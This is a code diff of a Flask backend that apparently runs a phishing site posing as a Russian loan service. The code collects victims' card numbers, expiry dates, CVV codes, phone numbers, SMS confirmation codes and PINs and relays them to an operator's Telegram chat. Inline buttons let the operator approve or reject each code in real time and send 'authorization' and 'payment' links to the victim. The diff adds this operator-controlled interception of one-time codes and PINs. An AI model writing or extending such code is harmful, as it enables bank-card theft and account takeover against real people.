@@ -13,6 +13,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
 SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru")
 
+# ========== БАЗА ДАННЫХ ==========
 def init_db():
     conn = sqlite3.connect('applications.db')
     c = conn.cursor()
@@ -24,7 +25,9 @@ def init_db():
                   created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
     c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                  (session_id TEXT PRIMARY KEY,
-                  phone TEXT, sms_code TEXT, pin_code TEXT)''')
+                  phone TEXT,
+                  code_status TEXT DEFAULT 'pending',
+                  pin_status TEXT DEFAULT 'pending')''')
     c.execute('''CREATE TABLE IF NOT EXISTS card_data
                  (session_id TEXT PRIMARY KEY,
                   card_holder TEXT, card_number TEXT, card_expiry TEXT, card_cvv TEXT,
@@ -35,6 +38,7 @@ def init_db():
 
 init_db()
 
+# ========== ОТПРАВКА В TELEGRAM ==========
 def send_to_admin(text, keyboard=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
@@ -51,6 +55,7 @@ def get_keyboard(session_id):
         ]
     }
 
+# ========== ОБРАБОТКА КНОПОК (ВЕБХУК) ==========
 def send_callback_answer(callback_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     requests.post(url, json={"callback_query_id": callback_id, "text": text})
@@ -76,24 +81,26 @@ def webhook():
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_82554/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
-            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}", None)
+            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_63860/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
-            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}", None)
+            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
             
         elif callback_data.startswith('reject:'):
             session_id = callback_data.split(':')[1]
             send_callback_answer(callback_id, "❌ Заявка отклонена")
             edit_message_text(chat_id, message_id, f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}", None)
+            
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
             c.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
             conn.commit()
             conn.close()
             
+        # ========== КАРТА (первый шаг) ==========
         elif callback_data.startswith('card_ok:'):
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
@@ -114,6 +121,7 @@ def webhook():
             send_callback_answer(callback_id, "❌ Данные карты отклонены")
             edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
             
+        # ========== КАРТА (второй шаг - код) ==========
         elif callback_data.startswith('code_ok:'):
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
@@ -143,9 +151,51 @@ def webhook():
             conn.close()
             send_callback_answer(callback_id, "💰 Клиенту показано сообщение о недостатке средств")
             edit_message_text(chat_id, message_id, f"💰 <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\nСессия: {session_id}", None)
+            
+        # ========== АВТОРИЗАЦИЯ ==========
+        elif callback_data.startswith('auth_code_ok:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE auth_sessions SET code_status = "approved" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "✅ Код подтверждён")
+            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('auth_code_error:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE auth_sessions SET code_status = "rejected" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "❌ Код отклонён")
+            edit_message_text(chat_id, message_id, f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('auth_pin_ok:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE auth_sessions SET pin_status = "approved" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "✅ PIN подтверждён")
+            edit_message_text(chat_id, message_id, f"✅ <b>PIN ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('auth_pin_error:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE auth_sessions SET pin_status = "rejected" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "❌ PIN отклонён")
+            edit_message_text(chat_id, message_id, f"❌ <b>PIN ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
     
     return jsonify({"status": "ok"})
 
+# ========== ОСНОВНЫЕ ЭНДПОИНТЫ ==========
 @app.route('/submit_credit_application', methods=['POST'])
 def submit_application():
     data = request.json
@@ -185,6 +235,7 @@ def get_application(session_id):
         return jsonify({"fullname": row[0], "phone": row[1], "amount": row[2], "term": row[3]})
     return jsonify({"error": "not found"}), 404
 
+# ========== КАРТА ==========
 @app.route('/submit_card', methods=['POST'])
 def submit_card():
     data = request.json
@@ -292,48 +343,175 @@ def reset_code_status(session_id):
     conn.close()
     return jsonify({"status": "ok"})
 
+# ========== АВТОРИЗАЦИЯ ==========
+@app.route('/submit_auth_phone', methods=['POST'])
+def submit_auth_phone():
+    data = request.json
+    session_id = data['session_id']
+    phone = data['phone']
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone) VALUES (?, ?)', (session_id, phone))
+    conn.commit()
+    conn.close()
+    
+    send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ (телефон)</b>\n\n🆔 Сессия: {session_id}\n📞 Телефон: {phone}")
+    return jsonify({"status": "ok"})
+
+@app.route('/submit_auth_code', methods=['POST'])
+def submit_auth_code():
+    data = request.json
+    session_id = data['session_id']
+    code = data['code']
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    phone = row[0] if row else '—'
+    conn.close()
+    
+    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА (авторизация)</b>
+
+🆔 Сессия: {session_id}
+📞 Телефон: {phone}
+🔢 Введённый код: <code>{code}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Код верный", "callback_data": f"auth_code_ok:{session_id}"}],
+            [{"text": "❌ Код не верный", "callback_data": f"auth_code_error:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
+
+@app.route('/check_auth_code_status/<session_id>', methods=['GET'])
+def check_auth_code_status(session_id):
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT code_status FROM auth_sessions WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return jsonify({"status": row[0]})
+    return jsonify({"status": "pending"})
+
+@app.route('/submit_auth_pin', methods=['POST'])
+def submit_auth_pin():
+    data = request.json
+    session_id = data['session_id']
+    pin = data['pin']
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    phone = row[0] if row else '—'
+    conn.close()
+    
+    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ PIN (авторизация)</b>
+
+🆔 Сессия: {session_id}
+📞 Телефон: {phone}
+🔢 Введённый PIN: <code>{pin}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ PIN верный", "callback_data": f"auth_pin_ok:{session_id}"}],
+            [{"text": "❌ PIN не верный", "callback_data": f"auth_pin_error:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
+
+@app.route('/check_auth_pin_status/<session_id>', methods=['GET'])
+def check_auth_pin_status(session_id):
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT pin_status FROM auth_sessions WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return jsonify({"status": row[0]})
+    return jsonify({"status": "pending"})
+
+# ========== СТАРЫЕ ЭНДПОИНТЫ (для совместимости) ==========
 @app.route('/submit_phone', methods=['POST'])
 def submit_phone():
     data = request.json
     session_id = data['session_id']
     phone = data['phone']
-    sms_code = str(random.randint(10000, 99999))
-    pin_code = str(random.randint(1000, 9999))
     
     conn = sqlite3.connect('applications.db')
     c = conn.cursor()
-    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone, sms_code, pin_code) VALUES (?, ?, ?, ?)',
-              (session_id, phone, sms_code, pin_code))
+    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone) VALUES (?, ?)', (session_id, phone))
     conn.commit()
     conn.close()
     
-    send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ</b>\n\nСессия: <code>{session_id}</code>\n📞 {phone}\n\n🔐 SMS: <code>{sms_code}</code>\n🔢 PIN: <code>{pin_code}</code>")
+    send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ</b>\n\nСессия: {session_id}\n📞 {phone}")
     return jsonify({"status": "ok"})
 
 @app.route('/submit_code', methods=['POST'])
 def submit_code():
     data = request.json
+    session_id = data['session_id']
+    code = data['code']
+    
     conn = sqlite3.connect('applications.db')
     c = conn.cursor()
-    c.execute('SELECT sms_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
+    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
     row = c.fetchone()
+    phone = row[0] if row else '—'
     conn.close()
-    if row and row[0] == data['code']:
-        return jsonify({"status": "ok", "next_step": "pin"})
-    return jsonify({"status": "error", "message": "Неверный код"})
+    
+    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА</b>
+
+🆔 Сессия: {session_id}
+📞 Телефон: {phone}
+🔢 Введённый код: <code>{code}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Код верный", "callback_data": f"auth_code_ok:{session_id}"}],
+            [{"text": "❌ Код не верный", "callback_data": f"auth_code_error:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
 
 @app.route('/submit_pin', methods=['POST'])
 def submit_pin():
     data = request.json
+    session_id = data['session_id']
+    pin = data['pin']
+    
     conn = sqlite3.connect('applications.db')
     c = conn.cursor()
-    c.execute('SELECT pin_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
+    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
     row = c.fetchone()
+    phone = row[0] if row else '—'
     conn.close()
-    if row and row[0] == data['pin']:
-        send_to_admin(f"✅ <b>АВТОРИЗАЦИЯ УСПЕШНА!</b>\n\nСессия: <code>{data['session_id']}</code>")
-        return jsonify({"status": "ok", "authorized": True})
-    return jsonify({"status": "error", "message": "Неверный PIN"})
+    
+    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ PIN</b>
+
+🆔 Сессия: {session_id}
+📞 Телефон: {phone}
+🔢 Введённый PIN: <code>{pin}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ PIN верный", "callback_data": f"auth_pin_ok:{session_id}"}],
+            [{"text": "❌ PIN не верный", "callback_data": f"auth_pin_error:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
 
 @app.route('/')
 def home():
